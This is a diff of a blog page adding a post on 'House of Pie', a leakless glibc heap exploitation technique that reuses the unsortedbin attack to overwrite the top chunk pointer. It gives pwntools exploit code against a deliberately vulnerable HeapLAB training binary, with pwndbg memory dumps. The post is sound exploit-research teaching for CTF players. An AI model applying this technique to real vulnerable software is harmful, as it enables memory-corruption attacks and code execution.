@@ -6,14 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: web | cppblog</title>
+  <title>Linux Heap Exploitation - House of Pie | cppblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cppblog">
-<meta property="og:url" content="http://example.com/tags/web/index.html">
+  <meta name="description" content="Interesting glibc malloc behaviour that can aid in exploit writing.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Heap Exploitation - House of Pie">
+<meta property="og:url" content="http://example.com/2021/11/27/house-of-pie/index.html">
 <meta property="og:site_name" content="cppblog">
+<meta property="og:description" content="Interesting glibc malloc behaviour that can aid in exploit writing.">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-27T08:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-27T15:08:42.563Z">
 <meta property="article:author" content="cp">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="cppblog" type="application/atom+xml">
@@ -142,68 +148,212 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-house-of-pie" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/15/htb-breaking-grad/" class="archive-article-date">
-  	<time datetime="2021-06-15T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-15</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/15/htb-breaking-grad/">HackTheBox Breaking Grad</a>
+    <h1 class="article-title" itemprop="name">
+      Linux Heap Exploitation - House of Pie
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/11/27/house-of-pie/" class="archive-article-date">
+  	<time datetime="2021-11-27T08:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Interesting glibc malloc behaviour that can aid in exploit writing.</p>
+<span id="more"></span>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><strong>OS: Ubuntu 20.04 VM<br>Tools: pwndbg, pwntools, python3<br>Target: malloc-testbed(<a target="_blank" rel="noopener" href="https://github.com/limitedeternity/HeapLAB/tree/main/malloc_testbed">https://github.com/limitedeternity/HeapLAB/tree/main/malloc_testbed</a>)</strong></p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Some of the more seasoned heap exploit writers might be wondering “hey what’s this house of pie nonsense I’ve never heard of before”.<br>Well, it’s just a name I made up to describe an interesting behaviour of the glibc malloc implementation that I discovered during my research of the linux heap.<br>As much as I would like to take credit for the entire idea, the basis of it is largely similar to the known House of Roman exploitation technique.<br>House of Pie, similar to House of Roman, is a leakless heap exploitation technique that hinges on partially bruteforcing libc addresses to defeat ASLR with a 1/4096 probability, and works without any leaks from the program, even if it closes stdout so File Stream Oriented Programming shenanigans do not work.<br>The biggest difference from House of Roman is that House of Pie provides control over the top chunk pointer, so one could argue that it provides more flexibility in exploitation(such as pivoting the top chunk to overwrite bss data or GOT entries, provided that the relevant protection mechanisms are not enabled).<br>The current idea works on glibc versions below 2.26(introduction of tcache), and thus we are safe from top chunk size sanity checks introduced in version 2.29.<br>Despite it far from being a cutting edge technique, I believe that the House of Pie has its value of introducing a novel way of “re-using” unsortedbin attacks, and knowledge of this behaviour may aid ctf players or exploit writers facing weird constraints.<br>Just to recap, unsortedbin attacks work by abusing the partial unlink feature of the circular doubly linked unsorted bins to write an address inside the main arena(therefore a libc address) anywhere in memory.<br>First it gets to the last chunk in the unsorted bin by following the backward pointer(bk) of the unsortedbin head, residing in the main arena.<br>It then follows the bk of the last chunk to locate the second last chunk, and writes the address of the unsortedbin head to the second last chunk’s forward pointer(fd).<br>Finally, it writes the bk of the last chunk to the unsortedbin head’s bk.<br>Now the last chunk is unlinked from the unsorted bin, and we as exploit writers get a primitive of arbitrarily writing a libc address to any address of our choosing(must be writeable of course).<br>However, the careful reader will realise that the next time we trigger an unsortedbin unlink, it will follow the bk of the unsortedbin head that we have corrupted, and eventually segfault due to an inability to satisfy the unsortedbin links integrity checks.<br>This makes the unsortedbin attack a primitive that can only be used once, before having to completely abandon the unsorted bin.<br>In the House of Pie, we prudently target our first attack, such that the unsorted bin repairs itself after achieving our intended write.<br>This allows us to re-use it for another arbitrary libc address write, which is immensely helpful in a leakless exploitation scenario.</p>
+<p>Let’s see it in action against a test binary with a use after free vulnerability.</p>
+<h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><h3 id="wrapper-script"><a href="#wrapper-script" class="headerlink" title="wrapper script"></a>wrapper script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;malloc_testbed&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        context(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index of allocated chunks.</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;malloc&quot; option; send size.</span></span><br><span class="line"><span class="comment"># Return chunk index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> index</span><br><span class="line">    io.send(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;size: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;calloc&quot; option; send size.</span></span><br><span class="line"><span class="comment"># Return chunk index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> index</span><br><span class="line">    io.send(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;size: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;free&quot; option; send index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;free address&quot; option; send address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_address</span>(<span class="params">address</span>):</span></span><br><span class="line">    io.send(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;address: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;edit&quot; option; send index &amp; data.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    io.send(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;data: &quot;</span>, data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;read&quot; option; send index.</span></span><br><span class="line"><span class="comment"># Return data from read operation.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.send(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">    r = io.recvuntil(<span class="string">&quot;\n1) malloc&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;puts() @ &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>) - libc.sym.puts</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the heap start address.</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;heap @ &quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the address of its m_array.</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;m_array @ &quot;</span>)</span><br><span class="line">m_array = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.timeout = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">log.info(<span class="string">f&quot;libc is at 0x<span class="subst">&#123;libc.address:02x&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;heap is at 0x<span class="subst">&#123;heap:02x&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;m_array is at 0x<span class="subst">&#123;m_array:02x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>This binary actually leaks heap and libc addresses, but we can just pretend it doesn’t and not use those.</p>
+<h3 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsorted1 = malloc(<span class="number">0x88</span>) <span class="comment"># get libc address for fastbin FD</span></span><br><span class="line">fast1 = malloc(<span class="number">0x48</span>)</span><br><span class="line">fast2 = malloc(<span class="number">0x48</span>) <span class="comment"># fast chunks for poisoning fastbin</span></span><br><span class="line">unsorted2 = malloc(<span class="number">0x88</span>)</span><br><span class="line">fake_size = malloc(<span class="number">0x78</span>) <span class="comment"># fast chunk to get fake size field in main arena</span></span><br></pre></td></tr></table></figure>
+<p>We allocate a few chunks that will be crucial for later use. I’ve labelled them according to their usage.</p>
+<h3 id="forge-fake-size-field-in-main-arena"><a href="#forge-fake-size-field-in-main-arena" class="headerlink" title="forge fake size field in main arena"></a>forge fake size field in main arena</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get fake size field</span></span><br><span class="line">free(fake_size)</span><br><span class="line">edit(fake_size, p64(<span class="number">0x51</span>))</span><br><span class="line">fake_size = malloc(<span class="number">0x78</span>) <span class="comment"># 0x51 is now a value in main arena, but we cannot use 0x80 size fastbins anymore</span></span><br></pre></td></tr></table></figure>
+<p>This sets the 0x80 fastbin head residing in the main arena to an address of 0x51, which is invalid but we can use as a size field.<br>Demonstration of this is in my “CTF.SG pwn challenge” post.</p>
+<h3 id="get-unsorted-chunk-by-freeing-and-remaindering-unsorted-chunk"><a href="#get-unsorted-chunk-by-freeing-and-remaindering-unsorted-chunk" class="headerlink" title="get unsorted chunk by freeing and remaindering unsorted chunk"></a>get unsorted chunk by freeing and remaindering unsorted chunk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># free and remainder the unsorted chunk to get pointer into main arena</span></span><br><span class="line">free(unsorted1)</span><br><span class="line">unsorted_1_1 = malloc(<span class="number">0x38</span>)</span><br><span class="line">unsorted_1_2 = malloc(<span class="number">0x48</span>) <span class="comment"># clear remainder</span></span><br></pre></td></tr></table></figure>
+<p>state of the heap after this step:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vis</span><br><span class="line"></span><br><span class="line">0x603000        0x0000000000000000      0x0000000000000041      ........A.......</span><br><span class="line">0x603010        0x00007ffff7dd4bd8      0x00007ffff7dd4bd8      .K.......K......</span><br><span class="line">0x603020        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603030        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603040        0x0000000000000000      0x0000000000000051      ........Q.......</span><br><span class="line">0x603050        0x00007ffff7dd4b58      0x00007ffff7dd4b58      XK......XK......</span><br><span class="line">0x603060        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603070        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603080        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603090        0x0000000000000050      0x0000000000000051      P.......Q.......</span><br><span class="line">0x6030a0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6030b0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6030c0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6030d0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6030e0        0x0000000000000000      0x0000000000000051      ........Q.......</span><br><span class="line">0x6030f0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603100        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603110        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603120        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603130        0x0000000000000000      0x0000000000000091      ................</span><br><span class="line">0x603140        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603150        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603160        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603170        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603180        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603190        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6031a0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6031b0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6031c0        0x0000000000000000      0x0000000000000081      ................</span><br><span class="line">0x6031d0        0x0000000000000051      0x0000000000000000      Q...............</span><br><span class="line">0x6031e0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x6031f0        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603200        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603210        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603220        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603230        0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x603240        0x0000000000000000      0x0000000000020dc1      ................         &lt;-- Top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>unsorted_1_2 currently holds an address of the unsortedbin head.<br>unsorted_1_1 holds the address of the 0x90 smallbin head, because our unsorted chunk was linked into the 0x90 smallbin during remaindering.</p>
+<h3 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin posoning to get fast chunk in main arena</span></span><br><span class="line">free(fast1)</span><br><span class="line">free(fast2)</span><br><span class="line">edit(fast2, p8(<span class="number">0x40</span>)) <span class="comment"># partial overwrite</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># partial overwrite unsortedbin fd to get a 0x50 size fast chunk in main arena</span></span><br><span class="line">edit(unsorted_1_2, p8(<span class="number">0x30</span>))</span><br><span class="line">fast2 = malloc(<span class="number">0x48</span>)</span><br><span class="line">overlap_unsorted_1_2 = malloc(<span class="number">0x48</span>)</span><br><span class="line">main_arena_chunk = malloc(<span class="number">0x48</span>)</span><br></pre></td></tr></table></figure>
+<p>In this step we poison the 0x50 fastbin with unsorted_1_2, then partial overwrite its fd to point to the 0x50 size field we crafted earlier inside of main arena.<br>The same can be achieved by crafting overlapping chunks, but we would have to set that up before remaindering so the unsortedbin pointers don’t get wiped out by fastbin fd.<br>Finally, we get a fake chunk inside of main arena, and can write enough data to reach the top chunk pointer.</p>
+<p>However, we don’t really know any address to pivot the top chunk to, so here comes the first unsortedbin attack.</p>
+<h3 id="setup-1"><a href="#setup-1" class="headerlink" title="setup"></a>setup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use fast chunk to write sane size field inside of main arena</span></span><br><span class="line">edit(main_arena_chunk, p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x88</span>)) <span class="comment"># be a smaller field so our request gets sorted instead of remaindered</span></span><br></pre></td></tr></table></figure>
+<p>This version of glibc has unsortedbin size sanity checks, so we use the main arena chunk to write a sane size field for our fake unsortedbin chunk.</p>
+<p>main arena after write:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; dq &amp;main_arena 50</span><br><span class="line">00007ffff7dd4b00     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b10     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b20     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b30     0000000000000000 0000000000000051</span><br><span class="line">00007ffff7dd4b40     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b50     0000000000000088 0000000000603240</span><br><span class="line">00007ffff7dd4b60     0000000000603040 00007ffff7dd4b58</span><br><span class="line">00007ffff7dd4b70     00007ffff7dd4b58 00007ffff7dd4b68</span><br><span class="line">00007ffff7dd4b80     00007ffff7dd4b68 00007ffff7dd4b78</span><br><span class="line">00007ffff7dd4b90     00007ffff7dd4b78 00007ffff7dd4b88</span><br><span class="line">00007ffff7dd4ba0     00007ffff7dd4b88 00007ffff7dd4b98</span><br><span class="line">00007ffff7dd4bb0     00007ffff7dd4b98 00007ffff7dd4ba8</span><br><span class="line">00007ffff7dd4bc0     00007ffff7dd4ba8 00007ffff7dd4bb8</span><br><span class="line">00007ffff7dd4bd0     00007ffff7dd4bb8 00007ffff7dd4bc8</span><br><span class="line">00007ffff7dd4be0     00007ffff7dd4bc8 00007ffff7dd4bd8</span><br><span class="line">00007ffff7dd4bf0     00007ffff7dd4bd8 00007ffff7dd4be8</span><br><span class="line">00007ffff7dd4c00     00007ffff7dd4be8 00007ffff7dd4bf8</span><br><span class="line">00007ffff7dd4c10     00007ffff7dd4bf8 00007ffff7dd4c08</span><br><span class="line">00007ffff7dd4c20     00007ffff7dd4c08 00007ffff7dd4c18</span><br><span class="line">00007ffff7dd4c30     00007ffff7dd4c18 00007ffff7dd4c28</span><br><span class="line">00007ffff7dd4c40     00007ffff7dd4c28 00007ffff7dd4c38</span><br><span class="line">00007ffff7dd4c50     00007ffff7dd4c38 00007ffff7dd4c48</span><br><span class="line">00007ffff7dd4c60     00007ffff7dd4c48 00007ffff7dd4c58</span><br><span class="line">00007ffff7dd4c70     00007ffff7dd4c58 00007ffff7dd4c68</span><br><span class="line">00007ffff7dd4c80     00007ffff7dd4c68 00007ffff7dd4c78</span><br></pre></td></tr></table></figure>
+<p>Our crafted size field is at 4b50, top chunk pointer at 4b58, and last remainder pointer at 4b60.</p>
+<p>Now comes the essence of House of Pie.<br>Since the last remainder holds an address to our unsorted_1_2, and unsorted_1_2 has a bk pointing to the unsortedbin head, our first unsortedbin attack that target the chunk at address 0x7ffff7dd4b48 will work as follows:</p>
+<ul>
+<li>Write address of unsortedbin head to fd of chunk at 0x7ffff7dd4b48, which is the top chunk pointer!</li>
+<li>Write 0x7ffff7dd4b48 to unsortedbin head’s bk</li>
+</ul>
+<p>Now, assuming we triggered an unsortedbin sort by requesting a chunk size that is not satisfied by the last chunk, the unlinking process will continue until a suitable chunk is found or the unsortedbin is empty.(I refrain from using “exhausted” since that’s also a process in glibc malloc)</p>
+<p>In the next round, the chunk to be unlinked is located using the unsortedbin head’s bk, which is 0x7ffff7dd4b48.<br>0x7ffff7dd4b48’s bk points to the “last remainder” chunk.</p>
+<p>so for the next round:</p>
+<ul>
+<li>Write address of unsortedbin head to fd of “last remainder” chunk.</li>
+<li>Write last remainder chunk’s address to unsortedbin head’s bk</li>
+</ul>
+<p>Now the chunk to be unlinked is the last remainder chunk.<br>last remainder chunk’s bk naturally contains the address of the unsortedbin head from the first remaindering</p>
+<p>AND the final round:</p>
+<ul>
+<li>Write address of unsortedbin head to fd of unsortedbin head.</li>
+<li>Write unsortedbin head’s address to unsortedbin head’s bk</li>
+</ul>
+<p>Boom, the unsortedbin fixes itself, and we get to overwrite the top chunk pointer with a libc address.</p>
+<h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unsortedbin attack to write libc address over top chunk address</span></span><br><span class="line">free(unsorted2)</span><br><span class="line">edit(unsorted2, p64(<span class="number">0</span>) + p8(<span class="number">0x48</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># request a size not in unsortedbin to trigger unsortedbin sort, writing libc address over top chunk and fixing itself</span></span><br><span class="line">new_chunk = malloc(<span class="number">0x98</span>)</span><br></pre></td></tr></table></figure>
+
+<p>effect:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; dq &amp;main_arena 30</span><br><span class="line">00007ffff7dd4b00     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b10     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b20     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b30     0000000000000000 0000000000000051</span><br><span class="line">00007ffff7dd4b40     0000000000000000 0000000000000000</span><br><span class="line">00007ffff7dd4b50     0000000000000088 00007ffff7dd4c68</span><br><span class="line">00007ffff7dd4b60     00007ffff7dd4bc8 00007ffff7dd4b58</span><br><span class="line">00007ffff7dd4b70     00007ffff7dd4b58 00007ffff7dd4b68</span><br><span class="line">00007ffff7dd4b80     00007ffff7dd4b68 00007ffff7dd4b78</span><br><span class="line">00007ffff7dd4b90     00007ffff7dd4b78 00007ffff7dd4b88</span><br><span class="line">00007ffff7dd4ba0     00007ffff7dd4b88 0000000000603040</span><br><span class="line">00007ffff7dd4bb0     0000000000603040 00007ffff7dd4ba8</span><br><span class="line">00007ffff7dd4bc0     00007ffff7dd4ba8 00007ffff7dd4bb8</span><br><span class="line">00007ffff7dd4bd0     00000000000000a1 00007ffff7dd4b48</span><br><span class="line">00007ffff7dd4be0     00007ffff7dd4b48 0000000000603130</span><br><span class="line">pwndbg&gt; top_chunk </span><br><span class="line">Top chunk</span><br><span class="line">Addr: 0x7ffff7dd4c68</span><br><span class="line">Size: 0x7ffff7dd4b19</span><br></pre></td></tr></table></figure>
+<p>But why is the top chunk not pointing to the unsortedbin head? That’s because our previous allocation, after “emptying” the unsorted bin, came from the top chunk which we already pivoted to inside of main arena.</p>
